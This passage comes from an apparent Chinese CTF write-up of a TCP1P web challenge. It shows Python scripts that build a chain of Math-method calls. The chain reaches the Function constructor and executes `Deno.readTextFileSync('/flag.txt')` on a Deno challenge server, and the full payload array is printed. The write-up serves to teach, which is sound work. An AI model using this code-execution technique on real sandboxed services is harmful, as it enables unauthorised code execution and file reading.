Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(5)))))))))))))))
Math.floor(Math.log2(Math.exp(34)))
Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(5))))))))))))))))))
Math.ceil(Math.log2(Math.exp(49)))
Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(5)))))))))))))))))))))
Math.floor(Math.log2(Math.exp(71)))
Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(5))))))))))))))))))))))))
Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.ceil(Math.log2(Math.exp(Math.floor(Math.log2(Math.exp(5))))))))))))))))))))))))
```

进一步完善payload，修改为POST过去的参数形式。

```python
import math
import re
import string
import json


basic_tansform = {
    1 : ["Math.random", "Math.ceil"],
    2 : ["Math.random", "Math.ceil", "Math.tan", "Math.ceil"],
    3 : ["Math.abs.name.length.valueOf"],
    4 : ["Math.ceil.name.length.valueOf"],
    5 : ["Math.acosh.name.length.valueOf"],
    6 : ["Math.fround.name.length.valueOf"]
}
def convert_the_target_num(target, res):
    if target < 7:
        return target
    for i in range(target):
        if math.floor(math.log2(math.exp(i))) == target:
            # print(i)
            res.append(f'Math.floor(Math.log2(Math.exp({i})))')
            convert_the_target_num(i, res)
            break
        elif math.ceil(math.log2(math.exp(i))) == target:
            # print(i)
            res.append(f'Math.ceil(Math.log2(Math.exp({i})))')
            convert_the_target_num(i, res)
            break

    return res


def convert_to_js(res):
    res.reverse()
    js_res = ''

    for i in range(len(res)):
        if i ==0:
            js_res = res[i]
            continue
        pattern = r"Math\.exp\((\d+)\)"
        match = re.search(pattern, res[i])
        if match:
            extracted_number = match.group(1)
            print(res[i])
            js_res = res[i].replace(extracted_number, js_res)
            print(js_res)
    return js_res


def convert_to_array(res):
    array_res = []
    global basic_tansform
    res.reverse()
    pattern = r"Math\.exp\((\d+)\)"
    match = re.search(pattern, res[0])
    if match:
        extracted_number = match.group(1)
        array_res.append(basic_tansform[int(extracted_number)][0])
        array_res.append("Math.exp")
        array_res.append("Math.log2")
        if res[0].startswith('Math.ceil'):
            array_res.append("Math.ceil")
        else:
            array_res.append("Math.floor")
    times = len(res)-1

    for i in range(times):
        array_res.append("Math.exp")
        array_res.append("Math.log2")
        if res[i+1].startswith('Math.ceil'):
            array_res.append("Math.ceil")
        else:
            array_res.append("Math.floor")

    return array_res


a = []
res = convert_the_target_num(150, a)
print(res)
print(json.dumps(convert_to_array(res)))

# print(convert_to_js(res))

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f9c7f00617c04d62b721f32e8ba87856.png)
那么就是最后一步合并起来就行了。

```python
import math
import re
import string
import json


basic_tansform = {
    1 : ["Math.random", "Math.ceil"],
    2 : ["Math.random", "Math.ceil", "Math.tan", "Math.ceil"],
    3 : ["Math.abs.name.length.valueOf"],
    4 : ["Math.ceil.name.length.valueOf"],
    5 : ["Math.acosh.name.length.valueOf"],
    6 : ["Math.fround.name.length.valueOf"]
}
def convert_the_target_num(target, res):
    if target < 7:
        return target
    for i in range(target):
        if math.floor(math.log2(math.exp(i))) == target:
            # print(i)
            res.append(f'Math.floor(Math.log2(Math.exp({i})))')
            convert_the_target_num(i, res)
            break
        elif math.ceil(math.log2(math.exp(i))) == target:
            # print(i)
            res.append(f'Math.ceil(Math.log2(Math.exp({i})))')
            convert_the_target_num(i, res)
            break

    return res


def convert_to_js(res):
    res.reverse()
    js_res = ''

    for i in range(len(res)):
        if i ==0:
            js_res = res[i]
            continue
        pattern = r"Math\.exp\((\d+)\)"
        match = re.search(pattern, res[i])
        if match:
            extracted_number = match.group(1)
            print(res[i])
            js_res = res[i].replace(extracted_number, js_res)
            print(js_res)
    return js_res


def convert_to_array(res):
    array_res = []
    global basic_tansform
    res.reverse()
    pattern = r"Math\.exp\((\d+)\)"
    match = re.search(pattern, res[0])
    if match:
        extracted_number = match.group(1)
        array_res.append(basic_tansform[int(extracted_number)][0])
        array_res.append("Math.exp")
        array_res.append("Math.log2")
        if res[0].startswith('Math.ceil'):
            array_res.append("Math.ceil")
        else:
            array_res.append("Math.floor")
    times = len(res)-1

    for i in range(times):
        array_res.append("Math.exp")
        array_res.append("Math.log2")
        if res[i+1].startswith('Math.ceil'):
            array_res.append("Math.ceil")
        else:
            array_res.append("Math.floor")
    array_res.append("Math.sin.name.constructor.fromCharCode")
    return array_res


a = []
res = convert_the_target_num(150, a)
# print(res)
each_res = convert_to_array(res)

payload = "flag"
starts = ["Math.seeds.pop"] * 5

for i in payload:
    starts += convert_to_array(convert_the_target_num(ord(i), []))
    starts += ["Math.seeds.push"]

starts += ["Math.abs.name.toLowerCase", "Math.seeds.join"]

print(json.dumps(starts))

# print(convert_to_js(res))


```
![在这里插入图片描述](https://img-blog.csdnimg.cn/adf2d046c04c4b929bc16d50a285fa89.png)

可以看到构建的flag的四个字母都出来了。

最后最后一步，去掉abs，并选择代码执行。

去abs怎么去？相信大家已经想到了。

我们观察random：

```php
this.newMath.random = function () {
            this.next = this.next * 3 + 1234;
            return (this.next / 65536) % 32767;
        };
```

懂了吧~ 所以我们把Math.abs.name.toLowerCase换成Math.random.name.toLowerCase就行了。


![在这里插入图片描述](https://img-blog.csdnimg.cn/fc5bb58759fe4be4b61de9cde8074274.png)
构造出字符串了~

所以我们把字符串替换成恶意代码就行。

这里有个捷径，我们看Dockerfile:

```php
FROM denoland/deno:alpine

WORKDIR /app

COPY . .
RUN deno cache main.js

RUN mv ./flag.txt /flag.txt

EXPOSE 8080

CMD [ "deno", "run", "-A", "--no-prompt", "--unstable", "main.js" ]

```
很明显deno是--no-prompt+--unstable，flag在根目录，所以我们直接构造：

```php
return Deno.readTextFileSync('/flag.txt')
```

然后随便套个function的constructor，用[]的map就能执行代码了，老套路。

最终payload:

```python
import math
import re
import string
import json


basic_tansform = {
    1 : ["Math.random", "Math.ceil"],
    2 : ["Math.random", "Math.ceil", "Math.tan", "Math.ceil"],
    3 : ["Math.abs.name.length.valueOf"],
    4 : ["Math.ceil.name.length.valueOf"],
    5 : ["Math.acosh.name.length.valueOf"],
    6 : ["Math.fround.name.length.valueOf"]
}
def convert_the_target_num(target, res):
    if target < 7:
        return target
    for i in range(target):
        if math.floor(math.log2(math.exp(i))) == target:
            # print(i)
            res.append(f'Math.floor(Math.log2(Math.exp({i})))')
            convert_the_target_num(i, res)
            break
        elif math.ceil(math.log2(math.exp(i))) == target:
            # print(i)
            res.append(f'Math.ceil(Math.log2(Math.exp({i})))')
            convert_the_target_num(i, res)
            break

    return res


def convert_to_js(res):
    res.reverse()
    js_res = ''

    for i in range(len(res)):
        if i ==0:
            js_res = res[i]
            continue
        pattern = r"Math\.exp\((\d+)\)"
        match = re.search(pattern, res[i])
        if match:
            extracted_number = match.group(1)
            print(res[i])
            js_res = res[i].replace(extracted_number, js_res)
            print(js_res)
    return js_res


def convert_to_array(res):
    array_res = []
    global basic_tansform
    res.reverse()
    pattern = r"Math\.exp\((\d+)\)"
    match = re.search(pattern, res[0])
    if match:
        extracted_number = match.group(1)
        array_res.append(basic_tansform[int(extracted_number)][0])
        array_res.append("Math.exp")
        array_res.append("Math.log2")
        if res[0].startswith('Math.ceil'):
            array_res.append("Math.ceil")
        else:
            array_res.append("Math.floor")
    times = len(res)-1

    for i in range(times):
        array_res.append("Math.exp")
        array_res.append("Math.log2")
        if res[i+1].startswith('Math.ceil'):
            array_res.append("Math.ceil")
        else:
            array_res.append("Math.floor")
    array_res.append("Math.sin.name.constructor.fromCharCode")
    return array_res


a = []
res = convert_the_target_num(150, a)
# print(res)
each_res = convert_to_array(res)

payload = "return Deno.readTextFileSync('/flag.txt')"
starts = ["Math.seeds.pop"] * 5

for i in payload:
    starts += convert_to_array(convert_the_target_num(ord(i), []))
    starts += ["Math.seeds.push"]

starts += ["Math.random.name.toLowerCase", "Math.seeds.join", "Math.abs.constructor", "Math.seeds.map"]

print(json.dumps(starts))

# print(convert_to_js(res))

```

```php
["Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.seeds.pop", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.fround.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.fround.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.fround.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.fround.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.fround.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.fround.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.fround.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.fround.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.acosh.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.fround.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.floor", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.fround.name.length.valueOf", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.exp", "Math.log2", "Math.ceil", "Math.sin.name.constructor.fromCharCode", "Math.seeds.push", "Math.random.name.toLowerCase", "Math.seeds.join", "Math.abs.constructor", "Math.seeds.map"]

```

这里相当于return了两次哦，大家可以想想为什么直接Deno.readTextFileSync('/flag.txt')不行。

![在这里插入图片描述](https://img-blog.csdnimg.cn/16243e0bb74044a089823463848ce315.png)
看到flag重复那么多次，就知道为什么直接Deno.readTextFileSync('/flag.txt')不行了。

**flag**：

TCP1P{well_no_math_required}


## 备注

事情太多，没时间看密码学和misc，先到这里。

题目总体而言难度不大，但都很精致，出题人很用心。

后面每周争取都打一次比赛，记录一下技巧。

欢迎持续关注。

## 版权声明

转载请联系作者并说明出处。